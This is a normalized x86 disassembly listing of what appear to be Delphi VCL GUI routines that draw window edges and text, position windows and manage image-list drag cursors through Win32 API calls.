push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x12c ]
neg eax
push eax
mov eax [ ebp - 0x10 ]
push eax
call InflateRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x125 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x123 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x124 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x4
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
add [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x8
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
sub [ eax + 0x8 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
sub [ eax + 0xc ] edx
sub_435890
push ebp
mov ebp esp
add esp 0xffffffbc
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x125 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_435b19
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetClientRect
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x30 ]
neg eax
push eax
mov eax [ ebp - 0x34 ]
neg eax
push eax
lea eax [ ebp - 0x24 ]
push eax
call OffsetRect
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x44 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x12c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x12c ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call InflateRect
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x125 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x12c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x34 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x30 ]
neg eax
push eax
mov eax [ ebp - 0x34 ]
neg eax
push eax
lea eax [ ebp - 0x34 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x130 ]
call sub_40f3c0
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ReleaseDC
retn
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x123 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x124 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
add [ ebp - 0x10 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowLongA
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x4
je r-xdata
mov eax [ ebp - 0x10 ]
sub [ ebp - 0x30 ] eax
test [ ebp - 0x12 ] 0x20
je r-xdata
mov eax [ ebp - 0x10 ]
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x122 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x2c ] eax
test [ ebp - 0x12 ] 0x10
je r-xdata
mov eax [ ebp - 0x10 ]
add [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x122 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x125 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x138 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x123 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x124 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x28 ] eax
sub_435b34
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_444534
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_42c3e4
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43130c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax [ ebp - 0xc ]
call sub_42df28
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42f4b4
sub_435bb4
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42b634
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x120 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
call sub_42b014
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_435c24
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_42b750
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
xor eax eax
call sub_4291dc
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_435c74
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
call sub_40f8a4
xor eax eax
push ebp
push sub_435d17
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
call sub_40fcf0
xor eax eax
push ebp
push sub_435cf4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435cfb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
xor edx edx
call sub_40fcf0
retn
sub_435d30
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_436664
mov edx 0x80ffff
mov eax [ ebp - 0x4 ]
call sub_42cc88
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40fae8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_40f4d0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_435db0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430998
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x80800000
mov eax [ ebp - 0x8 ]
or [ eax + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x8
mov eax [ ebp - 0x4 ]
call sub_430918
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x80
sub_435e1c
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_435e92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
xor edx edx
xor eax eax
call sub_43b7c8
push 0xf
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call DrawEdge
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435e99
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ReleaseDC
retn
sub_435ea0
push ebp
mov ebp esp
add esp 0xffffffe8
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435f37
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
add [ ebp - 0x14 ] 0x2
add [ ebp - 0x10 ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov eax [ eax + 0xc ]
mov edx 0x80000017
call sub_40e9f8
mov eax [ ebp - 0x4 ]
call sub_42f42c
or eax 0x810
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov eax [ ebp - 0x18 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40fc38
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f3e
lea eax [ ebp - 0x18 ]
call sub_44cae0
retn
sub_435f44
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x100
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xb000
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x108
jbe r-xdata
mov al 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xb001
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xb016
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xb017
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x111
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x200
jbe r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0xa0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x20a
jbe r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_435fec
push ebp
mov ebp esp
add esp 0xfffffff0
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_436092
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436099
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_44cb04
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40fa08
mov edx eax
add edx 0x6
mov eax [ ebp - 0x4 ]
call sub_42bf6c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40fa30
mov edx eax
add edx 0x4
mov eax [ ebp - 0x4 ]
call sub_42bfa8
sub_4360a0
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
push ecx
mov ecx 0x4
[ edi ] [ esi ]
pop ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1f8 ] 0x1
xor eax eax
push ebp
push sub_4361d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ca2c
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42e014
mov eax [ rw-data ]
mov eax [ eax ]
call sub_42272c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_42274c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_42272c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_42270c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_42274c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4226ec
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_42270c
mov [ ebp - 0x18 ] eax
push 0x50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4361d9
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1f8 ] 0x0
retn
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4226ec
mov [ ebp - 0xc ] eax
sub_4361e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
push ecx
mov ecx 0x4
[ edi ] [ esi ]
pop ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xb8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_436218
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_43b7c8
mov eax [ ebp - 0x4 ]
call sub_42f42c
or eax 0xc10
push eax
mov eax [ ebp + 0x8 ]
push eax
push 0xffffffff
mov eax [ ebp - 0xc ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40fc38
push eax
call DrawTextA
mov eax [ ebp + 0x8 ]
add [ eax + 0x8 ] 0x6
mov eax [ ebp + 0x8 ]
add [ eax + 0xc ] 0x2
mov esp ebp
pop ebp
retn 0x8
sub_436280
push ebp
mov ebp esp
add esp 0xffffffdc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ClientToScreen
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetWindowRect
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x24 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov esp ebp
pop ebp
retn 0x4
sub_4362d4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0xffff
je r-xdata
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43639d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movsx edx [ eax + 0x60 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422d64
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4447c4
mov eax [ ebp - 0x4 ]
movsx edx [ eax + 0x60 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_422d64
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4447c4
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0x10 ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebp - 0x8 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Destroy
retn
sub_4363a8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x70 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6c ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_402a74
push eax
call ImageList_BeginDrag
mov [ ebp - 0xd ] 0x1
mov al [ ebp - 0xd ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x62 ] al
jmp r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
sub_436414
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x60 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov ax [ ebp - 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] ax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x62 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4362d4
sub_436450
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x62 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4362d4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4364c8
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_4363a8
push 0x0
call ShowCursor
sub_4364c8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436540
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_436280
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
push eax
call ImageList_DragEnter
neg eax
sbb eax eax
neg eax
mov [ ebp - 0xd ] al
sub_436540
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
push eax
call ImageList_DragLeave
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x64 ] edx
sub_436574
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov [ ebp - 0xd ] 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_436280
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call ImageList_DragMove
neg eax
sbb eax eax
neg eax
mov [ ebp - 0xd ] al
jmp r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
sub_4365c8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
pop ecx
pop ebp
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_4365e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
pop ecx
pop ebp
retn
push 0x0
call ImageList_DragShowNolock
sub_436608
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4028dc
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x62 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_436540
call ImageList_EndDrag
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_436414
push 0xffffffff
call ShowCursor
jmp r-xdata
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_436664
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42f6cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1f0 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_42b014
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4366d4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_42f820
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
